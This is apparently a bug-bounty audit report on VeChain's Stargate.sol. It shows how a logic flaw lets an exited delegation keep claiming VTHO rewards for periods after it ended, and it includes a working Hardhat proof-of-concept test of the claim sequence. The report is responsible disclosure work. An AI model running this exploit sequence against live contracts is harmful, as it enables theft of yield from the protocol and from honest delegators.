# 60154 sc high exited delegations can continue claiming vtho rewards for future periods

**Submitted on Nov 19th 2025 at 09:53:12 UTC by @incogknito for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60154
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

### Brief/Intro

The `Stargate.sol` contract allows a delegation that has already exited and fully claimed all legitimate rewards up to its `endPeriod` to continue claiming VTHO rewards for later staking periods, where it should no longer be entitled to anything. Because the per-period reward share is computed using a token’s full effective stake but the total delegators’ effective stake no longer includes that token, an attacker can indefinitely siphon extra VTHO yield, causing systematic overpayment of rewards and direct loss of unclaimed yield from the protocol and/or honest delegators.

## Vulnerability Details

When a delegation exits, the protocol sets a finite `endPeriod` for that delegation. After that period, the NFT should no longer earn rewards. However, `Stargate.sol`'s period-selection logic allows an exited NFT to keep accruing rewards for periods strictly after `endPeriod`.

Looking at the `_claimableDelegationPeriods` function:

```solidity
(uint32 startPeriod, uint32 endPeriod) =
    $.protocolStakerContract.getDelegationPeriodDetails(delegationId);
(, , , uint32 completedPeriods) =
    $.protocolStakerContract.getValidationPeriodDetails(validator);

uint32 currentValidatorPeriod = completedPeriods + 1;
uint32 nextClaimablePeriod = $.lastClaimedPeriod[_tokenId] + 1;
if (nextClaimablePeriod < startPeriod) {
    nextClaimablePeriod = startPeriod;
}

// ended delegations
if (
    endPeriod != type(uint32).max &&
    endPeriod < currentValidatorPeriod &&
    endPeriod > nextClaimablePeriod
) {
    return (nextClaimablePeriod, endPeriod);
}

// fallback (“active”) branch
if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);
}
```

Suppose the delegation has already claimed all rewards up to its last valid period `endPeriod`, then `lastClaimedPeriod[_tokenId] = endPeriod`; so, `nextClaimablePeriod = endPeriod + 1`. And as the validator continues operating, `completedPeriods` increases so that `completedPeriods > endPeriod` and `currentValidatorPeriod = completedPeriods + 1`.

In this state, the 'ended delegation' branch requires `endPeriod > nextClaimablePeriod`, which is false, so that branch is skipped. The fallback 'active' branch sees `nextClaimablePeriod < currentValidatorPeriod` as true, and returns `firstClaimablePeriod = endPeriod + 1` and `lastClaimablePeriod = completedPeriods`.

So, after all legitimate periods up to `endPeriod` have been claimed, `_claimableDelegationPeriods` starts returning new claimable periods strictly greater than `endPeriod`, even though the delegation has ended.

## Impact Details

Any regular user who has delegated once can delegate an NFT to a validator and earn rewards normally, call `requestDelegationExit` while the delegation is active, setting a finite `endPeriod`, claim all legitimate rewards up to `endPeriod` and as the validator continues to earn delegator rewards for subsequent periods, repeatedly call `claimRewards` to receive additional VTHO for periods `> endPeriod`, where they should not participate.

This occurs because, in the `_claimableRewardsForPeriod` function, the numerator uses the exited NFT’s full effective stake, while the denominator excludes that stake from the validator’s total delegators’ effective stake for those periods.

## References

<https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L829-L856>

<https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L879-L934>

## Proof of Concept

The following PoC is a Hardhat unit test that reproduces the issue.

{% stepper %}
{% step %}

### Overview — sequence of actions reproduced by the test

* 1. Attacker stakes an NFT and delegates it to a validator; an honest delegator does the same to the same validator.
* 2. Fast-forward periods so both delegations become ACTIVE and rewards accrue.
* 3. Attacker requests exit while ACTIVE, setting a finite `endPeriod`. After one more completed period, the delegation becomes EXITED.
* 4. Attacker legitimately claims all rewards up to `endPeriod`.
* 5. Advance many more periods; the exited attacker delegation remains in status EXITED.
* 6. BUG: the exited delegator gets NEW claimable periods (strictly after `endPeriod`) and can claim VTHO for them, receiving tokens that they should not be eligible for.
     {% endstep %}
     {% endstepper %}

Full test file (place at packages/contracts/test/unit/Stargate/ExitedDelegationRewards.PoC.test.ts):

```solidity
// File: test/unit/Stargate/ExitedDelegationRewards.PoC.test.ts

import { expect } from "chai";
import {
    MyERC20,
    MyERC20__factory,
    ProtocolStakerMock,
    ProtocolStakerMock__factory,
    Stargate,
    StargateNFTMock,
    StargateNFTMock__factory,
    TokenAuctionMock,
    TokenAuctionMock__factory,
} from "../../../typechain-types";
import { getOrDeployContracts } from "../../helpers/deploy";
import { createLocalConfig } from "@repo/config/contracts/envs/local";
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { TransactionResponse } from "ethers";

describe("PoC: exited delegation can still claim rewards for future periods", () => {
    const VTHO_TOKEN_ADDRESS = "0x0000000000000000000000000000456E65726779";

    let stargateContract: Stargate;
    let stargateNFTMock: StargateNFTMock;
    let protocolStakerMock: ProtocolStakerMock;
    let legacyNodesMock: TokenAuctionMock;
    let deployer: HardhatEthersSigner;
    let user: HardhatEthersSigner;
    let otherUser: HardhatEthersSigner;
    let validator: HardhatEthersSigner;
    let otherValidator: HardhatEthersSigner;
    let otherAccounts: HardhatEthersSigner[];
    let tx: TransactionResponse;
    let vthoTokenContract: MyERC20;

    const LEVEL_ID = 1;

    const VALIDATOR_STATUS_UNKNOWN = 0;
    const VALIDATOR_STATUS_QUEUED = 1;
    const VALIDATOR_STATUS_ACTIVE = 2;
    const VALIDATOR_STATUS_EXITED = 3;

    const DELEGATION_STATUS_NONE = 0;
    const DELEGATION_STATUS_PENDING = 1;
    const DELEGATION_STATUS_ACTIVE = 2;
    const DELEGATION_STATUS_EXITED = 3;

    const MAX_CLAIMABLE_PERIODS = 8;

    beforeEach(async () => {
        const config = createLocalConfig();
        [deployer] = await ethers.getSigners();

        // Deploy protocol staker mock
        const protocolStakerMockFactory = new ProtocolStakerMock__factory(deployer);
        protocolStakerMock = await protocolStakerMockFactory.deploy();
        await protocolStakerMock.waitForDeployment();

        // Deploy StargateNFT mock
        const stargateNFTMockFactory = new StargateNFTMock__factory(deployer);
        stargateNFTMock = await stargateNFTMockFactory.deploy();
        await stargateNFTMock.waitForDeployment();

        // Deploy VTHO token to the energy address
        const vthoTokenContractFactory = new MyERC20__factory(deployer);
        const tokenContract = await vthoTokenContractFactory.deploy(
            deployer.address,
            deployer.address
        );
        await tokenContract.waitForDeployment();
        const tokenContractBytecode = await ethers.provider.getCode(tokenContract);
        await ethers.provider.send("hardhat_setCode", [VTHO_TOKEN_ADDRESS, tokenContractBytecode]);

        // Deploy legacy nodes mock
        const legacyNodesMockFactory = new TokenAuctionMock__factory(deployer);
        legacyNodesMock = await legacyNodesMockFactory.deploy();
        await legacyNodesMock.waitForDeployment();

        // Deploy Stargate using local config + mocks
        config.PROTOCOL_STAKER_CONTRACT_ADDRESS = await protocolStakerMock.getAddress();
        config.STARGATE_NFT_CONTRACT_ADDRESS = await stargateNFTMock.getAddress();
        config.MAX_CLAIMABLE_PERIODS = MAX_CLAIMABLE_PERIODS;

        const contracts = await getOrDeployContracts({ forceDeploy: true, config });
        stargateContract = contracts.stargateContract;
        vthoTokenContract = MyERC20__factory.connect(VTHO_TOKEN_ADDRESS, deployer);

        user = contracts.otherAccounts[0];
        otherUser = contracts.otherAccounts[1];
        validator = contracts.otherAccounts[2];
        otherValidator = contracts.otherAccounts[3];
        otherAccounts = contracts.otherAccounts;

        // Add validators
        tx = await protocolStakerMock.addValidation(validator.address, 120);
        await tx.wait();
        tx = await protocolStakerMock.addValidation(otherValidator.address, 120);
        await tx.wait();

        // Set Stargate address in mock and validator status to ACTIVE
        tx = await protocolStakerMock.helper__setStargate(stargateContract.target);
        await tx.wait();
        tx = await protocolStakerMock.helper__setValidatorStatus(
            validator.address,
            VALIDATOR_STATUS_ACTIVE
        );
        await tx.wait();
        tx = await protocolStakerMock.helper__setValidatorStatus(
            otherValidator.address,
            VALIDATOR_STATUS_ACTIVE
        );
        await tx.wait();

        // Configure StargateNFT mock level and token
        tx = await stargateNFTMock.helper__setLevel({
            id: LEVEL_ID,
            name: "Strength",
            isX: false,
            maturityBlocks: 10,
            scaledRewardFactor: 150,
            vetAmountRequiredToStake: ethers.parseEther("1"),
        });
        await tx.wait();

        tx = await stargateNFTMock.helper__setToken({
            tokenId: 10000,
            levelId: LEVEL_ID,
            mintedAtBlock: 0,
            vetAmountStaked: ethers.parseEther("1"),
            lastVetGeneratedVthoClaimTimestamp_deprecated: 0,
        });
        await tx.wait();

        tx = await stargateNFTMock.helper__setLegacyNodes(legacyNodesMock);
        await tx.wait();

        // Mint VTHO to Stargate so it can pay rewards
        tx = await vthoTokenContract
            .connect(deployer)
            .mint(stargateContract, ethers.parseEther("50000000"));
        await tx.wait();
    });

    it("PoC: exited delegation can still claim rewards for future periods", async () => {
        const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);

        // 1) Attacker stakes and delegates
        tx = await stargateContract.connect(user).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const attackerTokenId = await stargateNFTMock.getCurrentTokenId();

        // Honest delegator stakes and delegates to the same validator
        tx = await stargateContract.connect(otherUser).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const honestTokenId = await stargateNFTMock.getCurrentTokenId();

        tx = await stargateContract.connect(user).delegate(attackerTokenId, validator.address);
        await tx.wait();
        tx = await stargateContract.connect(otherUser).delegate(honestTokenId, validator.address);
        await tx.wait();

        // 2) Fast‑forward some periods so both delegations become ACTIVE and rewards accrue
        await (
            await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 4)
        ).wait();

        expect(await stargateContract.getDelegationStatus(attackerTokenId)).to.equal(
            DELEGATION_STATUS_ACTIVE
        );

        // 3) Attacker requests exit while ACTIVE (endPeriod is fixed internally)
        await (await stargateContract.connect(user).requestDelegationExit(attackerTokenId)).wait();

        // Move one more completed period so the delegation becomes EXITED
        await (
            await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 5)
        ).wait();

        expect(await stargateContract.getDelegationStatus(attackerTokenId)).to.equal(
            DELEGATION_STATUS_EXITED
        );

        // 4) First claim: attacker legitimately claims all rewards up to endPeriod
        const [, lastClaimable1] =
            await stargateContract.claimableDelegationPeriods(attackerTokenId);
        expect(lastClaimable1).to.be.greaterThan(0n);

        const claimable1 = await stargateContract["claimableRewards(uint256)"](attackerTokenId);
        expect(claimable1).to.be.greaterThan(0n);

        await (await stargateContract.connect(user).claimRewards(attackerTokenId)).wait();

        // 5) Advance many more periods; honest delegator stays active
        await (
            await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 10)
        ).wait();

        expect(await stargateContract.getDelegationStatus(attackerTokenId)).to.equal(
            DELEGATION_STATUS_EXITED
        );

        // 6) BUG: exited delegator gets NEW claimable periods in the future
        const [firstClaimable2, lastClaimable2] =
            await stargateContract.claimableDelegationPeriods(attackerTokenId);

        // New claimable range starts strictly after the already‑claimed range
        expect(firstClaimable2).to.be.greaterThan(lastClaimable1);
        expect(lastClaimable2).to.be.gte(firstClaimable2);

        const claimable2 = await stargateContract["claimableRewards(uint256)"](attackerTokenId);

        // If the bug is present, an EXITED delegator can still claim > 0 VTHO
        console.log("Second claimable amount after exit:", claimable2.toString());
        expect(claimable2).to.be.greaterThan(0n);

        const preBalance = await vthoTokenContract.balanceOf(user.address);
        await (await stargateContract.connect(user).claimRewards(attackerTokenId)).wait();
        const postBalance = await vthoTokenContract.balanceOf(user.address);

        console.log(
            "User VTHO balance before second claim:",
            preBalance.toString(),
            "after second claim:",
            postBalance.toString()
        );

        // PoC passes if the second claim after exit actually transfers VTHO to the attacker
        expect(postBalance - preBalance).to.equal(claimable2);
    });
});
```

To run the test:

* Place the file at packages/contracts/test/unit/Stargate/ExitedDelegationRewards.PoC.test.ts
* cd packages/contracts
* npx hardhat test test/unit/Stargate/ExitedDelegationRewards.PoC.test.ts
